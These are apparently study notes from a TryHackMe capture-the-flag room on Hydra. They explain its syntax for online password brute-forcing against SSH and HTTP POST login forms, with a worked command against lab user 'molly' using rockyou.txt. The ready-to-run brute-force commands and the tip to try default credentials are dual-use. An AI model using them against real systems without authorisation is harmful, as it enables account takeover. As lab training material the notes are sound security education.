# 4.4 - [Hydra](https://tryhackme.com/room/hydra)

## 🔍 Overview
- Hydra is a **brute force online password cracking tool** – fast network logon "hacking" tool.
- Supports **many protocols**: SSH, FTP, HTTP-GET/POST, HTTPS, SMTP, MySQL, VNC, SMB, Telnet, and more.
- **Purpose:** Run through a password list to guess credentials for authentication services.
- **Key lesson:** Strong passwords matter – common/default passwords are easy to crack.

---

## 🛠️ Hydra Command Syntax

### Basic SSH Brute Force
```bash
hydra -l <username> -P <wordlist> <target_ip> -t <threads> ssh
```

| Option | Description |
|--------|-------------|
| `-l` | Single username to test |
| `-L` | List of usernames (file) |
| `-p` | Single password to test |
| `-P` | List of passwords (file) |
| `-t` | Number of parallel threads (default: 16) |
| `-V` | Verbose output (shows each attempt) |
| `-s` | Specify non‑default port |

**Example SSH:**
```bash
hydra -l root -P passwords.txt 10.10.10.10 -t 4 ssh
```

---

### HTTP POST Form Brute Force
```bash
hydra -l <username> -P <wordlist> <target_ip> http-post-form "<path>:<login_creds>:<fail_string>"
```

| Option | Description |
|--------|-------------|
| `http-post-form` | Protocol/method (use `http-get-form` for GET) |
| `<path>` | Login page path (e.g., `/login.php`) |
| `<login_creds>` | Form fields: `username=^USER^&password=^PASS^` |
| `<fail_string>` | Text that appears when login fails (e.g., `F=incorrect`) |
| `-V` | Verbose output |

**Example POST:**
```bash
hydra -l admin -P rockyou.txt 10.10.10.10 http-post-form "/login.php:username=^USER^&password=^PASS^:F=incorrect" -V
```

**Note:** Use `F=` (fail) or `S=` (success) to indicate login outcome.

## 🎯 Task 1 – Web Form Brute Force

**Scenario:** Brute force `molly`'s web login password.

**Command used:**
```bash
hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.144.153.225 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -V
```

**Breakdown:**
- `-l molly` – target username
- `-P rockyou.txt` – password wordlist
- `http-post-form` – POST method
- `"/login/` – login page path
- `username=^USER^&password=^PASS^` – form fields
- `F=incorrect` – fail string when login fails
- `-V` – verbose output

## 🔑 Key Takeaways
- Hydra automates **online brute‑force attacks** against many protocols.
- Always know the **login page path**, **form field names**, and **failure string** for web forms.
- Use **verbose mode (`-V`)** to see progress and confirm attempts.
- **rockyou.txt** is the default go‑to wordlist; **SecLists** provides more specialised lists.
- **Strong passwords** (length + special chars) defeat brute‑force attacks.
- Default credentials (`admin:password`) are the first things to try.
